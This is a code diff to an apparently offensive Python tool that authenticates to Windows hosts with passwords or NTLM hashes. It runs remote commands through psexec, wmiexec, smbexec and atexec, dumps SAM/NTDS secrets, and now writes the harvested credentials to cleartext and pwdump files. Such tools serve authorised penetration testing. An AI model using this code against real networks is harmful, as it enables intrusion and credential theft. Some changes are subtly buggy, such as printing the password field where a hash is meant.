@@ -2,7 +2,7 @@
 '''
 Libraries
 '''
-import base64, sys, argparse, re, subprocess, os, time, logging, signal, urllib2, cmd, ntpath, string, random, ConfigParser, hashlib, traceback, tempfile, collections, ast
+import base64, sys, argparse, re, subprocess, os, time, logging, signal, urllib2, cmd, ntpath, string, random, ConfigParser, hashlib, traceback, tempfile, collections, ast, datetime
 import xml.etree.ElementTree as etree
 from threading import Thread, Lock, Event
 from Queue import Queue
@@ -3366,7 +3366,7 @@ def smb_server(working_dir, share_name):
 METHOD FUNCTIONS
 '''
 
-def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat):
+def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat, st):
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3382,35 +3382,61 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
     if attacks and encoder:
         with Timeout(timeout_value):
             try:
+                if hash:
+                    print("[*] Attempting to access system %s with user: %s hash: %s domain: %s at: %s") % (dst, usr, hash, dom, st)
+                else:
+                    print("[*] Attempting to access system %s with user: %s pwd: %s domain: %s at %s") % (dst, usr, pwd, dom, st)
+
                 shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = command, proto = protocol)
                 shell.play(dst)
                 data = shell.return_data()
                 output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
-                print("[!] An error occured: %s") % (e)
+                print("[!] An error occurred: %s") % (e)
+                if hash:
+                    print("[-] Cound not execute the command against %s using the domain %s user %s and hash %s at: %s") % (dst, dom, usr, pwd, st)
+                else:
+                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
                 return
     elif attacks and not encoder:
         with Timeout(timeout_value):
             try:
+                if hash:
+                    print("[*] Attempting to access system %s with user: %s hash: %s domain: %s at: %s") % (dst, usr, hash, dom, st)
+                else:
+                    print("[*] Attempting to access system %s with user: %s pwd: %s domain: %s at %s") % (dst, usr, pwd, dom, st)
+
                 shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = unprotected_command, proto = protocol)
                 shell.play(dst)
                 data = shell.return_data()
                 output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
-                print("[!] An error occured: %s") % (e)
+                print("[!] An error occurred: %s") % (e)
+                if hash:
+                    print("[-] Cound not execute the command against %s using the domain %s user %s and hash %s at: %s") % (dst, dom, usr, pwd, st)
+                else:
+                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
                 return
     else:         
         with Timeout(timeout_value):
             try:
+                if hash:
+                    print("[*] Attempting to access system %s with user: %s hash: %s domain: %s at: %s") % (dst, usr, hash, dom, st)
+                else:
+                    print("[*] Attempting to access system %s with user: %s pwd: %s domain: %s at %s") % (dst, usr, pwd, dom, st)
                 shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = unprotected_command, proto = protocol)
                 shell.play(dst)
                 data = shell.return_data()
                 output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
-                print("[!] An error occured: %s") % (e)
+                print("[!] An error occurred: %s") % (e)
+                if hash:
+                    print("[-] Cound not execute the command against %s using the domain %s user %s and hash %s at: %s") % (dst, dom, usr, pwd, st)
+                else:
+                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
                 return
 
-def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat):
+def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st):
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3420,17 +3446,21 @@ def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
     if attacks:
         print(instructions)
     if hash:
-        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s at: %s") % (dst, usr, hash, dom, st)
     else:
-        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s at: %s") % (dst, usr, pwd, dom, st)
     try:
         shell = PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
         shell.run(dst)
     except (Exception, KeyboardInterrupt), e:
-        print("[!] An error occured: %s") % (e)
+        print("[!] An error occurred: %s") % (e)
+        if hash:
+            print("[-] Cound not execute the command against %s using the domain %s user %s and hash %s at: %s") % (dst, dom, usr, pwd, st)
+        else:
+            print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
         return
 
-def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat):
+def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st):
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3440,17 +3470,21 @@ def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
     if attacks:
         print(instructions)
     if hash:
-        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s at: %s ") % (dst, usr, hash, dom, st)
     else:
-        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s at: %s") % (dst, usr, pwd, dom, st)
     try:
         shell = CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
         shell.run(dst)
     except (Exception, KeyboardInterrupt), e:
-        print("[!] An error occured: %s") % (e)
+        print("[!] An error occurred: %s") % (e)
+        if hash:
+            print("[-] Cound not execute the command against %s using the domain %s user %s and hash %s at: %s") % (dst, dom, usr, pwd, st)
+        else:
+            print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
         return
 
-def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat):
+def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat, st):
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3459,9 +3493,9 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
             return #replaced continue inside a function
     if attacks and encoder:
         if hash:
-            print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+            print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s at: %s") % (dst, usr, hash, dom, st)
         else:
-            print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+            print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s at: %s") % (dst, usr, pwd, dom, st)
         if command == "cmd.exe":
             sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
         with Timeout(timeout_value):
@@ -3472,13 +3506,16 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
-                print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
+                if hash:
+                    print("[-] Cound not execute the command against %s using the domain %s user %s and hash %s at: %s") % (dst, dom, usr, pwd, st)
+                else:
+                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
                 return #replaced continue inside a function
     elif attacks and not encoder:
         if hash:
-            print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+            print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s at: %s") % (dst, usr, hash, dom, st)
         else:
-            print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+            print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s at: %s") % (dst, usr, pwd, dom, st)
         if command == "cmd.exe":
             sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
         with Timeout(timeout_value):
@@ -3489,13 +3526,16 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
-                print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
+                if hash:
+                    print("[-] Cound not execute the command against %s using the domain %s user %s and hash %s at: %s") % (dst, dom, usr, pwd, st)
+                else:
+                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
                 return #changed from continue inside a function
     elif attacks:
         if hash:
-            print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+            print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s at: %s") % (dst, usr, hash, dom, st)
         else:
-            print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+            print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s at: %s") % (dst, usr, pwd, dom, st)
         if command == "cmd.exe":
             sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
         with Timeout(timeout_value):
@@ -3506,13 +3546,16 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
-                print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
+                if hash:
+                    print("[-] Cound not execute the command against %s using the domain %s user %s and hash %s at: %s") % (dst, dom, usr, pwd, st)
+                else:
+                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
                 return # changed from continue inside a function
     else:
         if hash:
-            print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+            print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s at: %s") % (dst, usr, hash, dom, st)
         else:
-            print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+            print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s at: %s") % (dst, usr, pwd, dom, st)
         if command == "cmd.exe":
             sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
         with Timeout(timeout_value):
@@ -3522,10 +3565,14 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 data = shell.return_data()
                 output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
-                print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
+                print("[!] An error occurred: %s") % (e)
+                if hash:
+                    print("[-] Cound not execute the command against %s using the domain %s user %s and hash %s at: %s") % (dst, dom, usr, pwd, st)
+                else:
+                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
                 return # changed from continue inside a function
 
-def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat): 
+def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st): 
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3535,9 +3582,9 @@ def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods
     if methods:
         sys.exit("[!] The --scout option is run without methods")
     if hash:
-        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s at: %s") % (dst, usr, hash, dom, st)
     else:
-        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s at: %s ") % (dst, usr, pwd, dom, st)
     opted = NetviewDetails(user = None, users = None, target = dst, targets = None, noloop = True, delay = '10', max_connections = '1000', domainController = None, debug = False)
     try:
         shell = USERENUM(username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, options=opted)
@@ -3545,10 +3592,14 @@ def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods
         data = shell.return_data() 
         output_handler(logger_obj, output_cat, data, dst, verbose)
     except (Exception, KeyboardInterrupt), e:
-        print("[!] An error occured: %s") % (e)
+        print("[!] An error occurred: %s") % (e)
+        if hash:
+            print("[-] Cound not execute the command against %s using the domain %s user %s and hash %s at: %s") % (dst, dom, usr, pwd, st)
+        else:
+            print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
         return
 
-def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat):
+def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st):
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3556,14 +3607,18 @@ def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntd
                 print("[-] Host %s port %s is closed") % (dst, verify_port)
             return #replaced continue inside a function
     if hash:
-        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s at: %s ") % (dst, usr, hash, dom, st)
     else:
-        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s at: %s") % (dst, usr, pwd, dom, st)
     shell = DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
     try:
         shell.dump()
     except (Exception, KeyboardInterrupt), e:
-        print("[!] An error occured during execution")
+        print("[!] An error occurred: %s") % (e)
+        if hash:
+            print("[-] Cound not execute the command against %s using the domain %s user %s and hash %s at: %s") % (dst, dom, usr, pwd, st)
+        else:
+            print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
         return
 
 def instructions_func(payload, src_port, command, unprotected_command, smbexec_cmd, execution, delivery):
@@ -3823,18 +3878,19 @@ def output_handler(logger_obj, output_cat, data, dst, verbose):
 
 
 def method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods):
+    st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
     if psexec_cmd:
-        psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat)
+        psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st)
     elif wmiexec_cmd:
-        wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat)
+        wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat, st)
     elif netview_cmd:
-        netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat)
+        netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st)
     elif smbexec_cmd:
-        smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat)
+        smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st)
     elif atexec_cmd:
-        atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat)
+        atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat, st)
     elif sam_dump:
-        sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat)
+        sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st)
     else:
         print(instructions)   
 
@@ -3844,27 +3900,79 @@ def matrix_read(creds_matrix):
         creds_dict = ast.literal_eval(s)
     return(creds_dict)
     
-def matrix_write(creds_dict):
-    creds_matrix = "/opt/ranger/results/recovery/recovery_matrix"
+def matrix_write(creds_dict, recovery):
+    st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
+    if recovery:
+        creds_matrix = "/opt/ranger/results/recovery/recovery_matrix"
+    else:
+        creds_matrix = "/opt/ranger/results/credentials/credential_matrix_" + st
     with open(creds_matrix, 'w') as f:
         f.write(str(creds_dict))
     return(creds_matrix)
 
-def targets_write(final_targets):
-    updated_targets = "/opt/ranger/results/recovery/recovery_targets"
+def targets_write(final_targets, recovery):
+    if recovery:
+        updated_targets = "/opt/ranger/results/recovery/recovery_targets"
+    else:
+        updated_targets = "/opt/ranger/log/remaining_targets.log"
     with open(updated_targets, 'w') as f:
         for tgt in final_targets:
             f.write(tgt + '\n')
     return(updated_targets)
 
 def targets_curtail(dst, final_targets):
-    print(dst) #DEBUG
     try:
         tgt_index = final_targets.index(dst) + 1
     except ValueError, e:
         tgt_index = None
     final_targets = final_targets[tgt_index:]
     return(final_targets)
+
+def cleartext_writer(creds_dict, recovery):
+    st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
+    cred_list = []
+    if recovery:
+        cred_file = "/opt/ranger/results/recovery/recovery_cleartext"
+    else:
+        cred_file = "/opt/ranger/results/credentials/cleartext_" + st
+    for k, v in creds_dict.iteritems():
+        if v[5]:
+            set = k + " " + v[5]
+            cred_list.append(set)
+    with open(cred_file, 'w') as f:
+        for cred in cred_list:
+            f.write(cred + '\n')
+    return(cred_file)
+
+#creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp=[], groups_temp={}, logged_in_temp=[]}
+
+def pwdump_writer(creds_dict, recovery):
+    st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
+    hash_list = []
+    if recovery:
+        pwdump = "/opt/ranger/results/recovery/recovery_pwdump"
+    else:
+        pwdump = "/opt/ranger/results/credentials/clear_text_" + st
+    for k, v in creds_dict.iteritems():
+        if v[0] and v[1] and v[2]:
+            set = v[4] + ":" + v[0] + ":" + v[1] + ":" + v[2] + ":::"
+            hash_list.append(set)
+    with open(pwdump, 'w') as f:
+        for hash in hash_list:
+            f.write(hash + '\n')
+    return(pwdump)
+
+def data_writer(creds_dict, dst, final_targets, recovery):
+    fn = matrix_write(creds_dict, recovery)
+    print("[+] Wrote the saved credential matrix to: %s") % (fn)
+    updated_targets = targets_curtail(dst, final_targets)
+    fn = targets_write(updated_targets, recovery)
+    print("[+] Wrote the remaining targets to the following file: %s") % (fn)
+    fn = cleartext_writer(creds_dict, recovery)
+    print("[+] Wrote the cleartext credentials to the following file: %s") % (fn)
+    fn = pwdump_writer(creds_dict, recovery)
+    print("[+] Wrote the pwdump credentials to the following file: %s") % (fn)
+
 
 def main():
     # If script is executed at the CLI
@@ -4087,6 +4195,7 @@ Create Pasteable Executor Attack:
     NTLM_temp = ""
     output_cat = {}
     matrix_list = []
+    recovery = False
     #Credential Matrix
     #creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp=[], groups_temp={}, logged_in_temp=[]}
 
@@ -4111,13 +4220,10 @@ Create Pasteable Executor Attack:
     # Hard Kill Control for Processes
     def signal_handler(signum, frame):
         print("[!] Signal handler called with signal: %s") % (signum)
+        recovery = True
         try:
             print("[*] Attempting to write data for recovery as necessary!")
-            fn = matrix_write(creds_dict)
-            print("[+] Wrote the saved credential matrix to: %s") % (fn)
-            updated_targets = targets_curtail(dst, final_targets)
-            fn = targets_write(updated_targets)
-            print("[+] Wrote the remaining targets to the following file: %s") % (fn)
+            data_writer(creds_dict, dst, final_targets, recovery)
         except Exception, e:
             print("[!] Failed to write data to files, the following error occured : %s") % (e)
         finally:
@@ -4190,7 +4296,10 @@ Create Pasteable Executor Attack:
                         temp_list[2] = NTLM_temp
                         temp_list[3] = hash_temp    
                     else:
-                        creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
+                        local_admin_temp=[]
+                        groups_temp={}
+                        logged_in_temp=[]
+                        creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp]
                 elif cred.count(' ') == 0:
                     hash_temp = cred.rstrip()
                     dom_temp = dom
@@ -4207,7 +4316,10 @@ Create Pasteable Executor Attack:
                         temp_list[2] = NTLM_temp
                         temp_list[3] = hash_temp
                     else:
-                        creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
+                        local_admin_temp=[]
+                        groups_temp={}
+                        logged_in_temp=[]
+                        creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp]
             elif cred and ":" in cred and cred.count(':') == 1:
                 if cred.count(' ') == 1:
                     cred = cred.rstrip()
@@ -4226,7 +4338,10 @@ Create Pasteable Executor Attack:
                         temp_list[2] = NTLM_temp
                         temp_list[3] = hash_temp
                     else:
-                        creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
+                        local_admin_temp=[]
+                        groups_temp={}
+                        logged_in_temp=[]
+                        creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp]
                 elif cred.count(' ') == 2:
                     cred = cred.rstrip()
                     usr_temp, pwd_temp, dom_temp = cred.sploit(' ')
@@ -4251,7 +4366,10 @@ Create Pasteable Executor Attack:
                     LM_temp = None
                     NTLM_temp = None
                     hash_temp = None
-                    creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
+                    local_admin_temp=[]
+                    groups_temp={}
+                    logged_in_temp=[]
+                    creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp]
             elif cred.count(' ') == 2:
                 cred = cred.rstrip()
                 usr_temp, pwd_temp, dom_temp = cred.split(' ')
@@ -4269,7 +4387,10 @@ Create Pasteable Executor Attack:
                     LM_temp = None
                     NTLM_temp = None
                     hash_temp = None
-                    creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
+                    local_admin_temp=[]
+                    groups_temp={}
+                    logged_in_temp=[]
+                    creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp]
             else:
                 sys.exit("[!] An error occured trying to parse the credential file")
     
@@ -4578,7 +4699,8 @@ Create Pasteable Executor Attack:
         except (Exception, KeyboardInterrupt), e:
             print("[!] An error occurred: %s") % (e)
 
-    signal.pause()
+    data_writer(creds_dict, dst, final_targets, recovery)   
 
 if __name__ == '__main__':
     main()
+
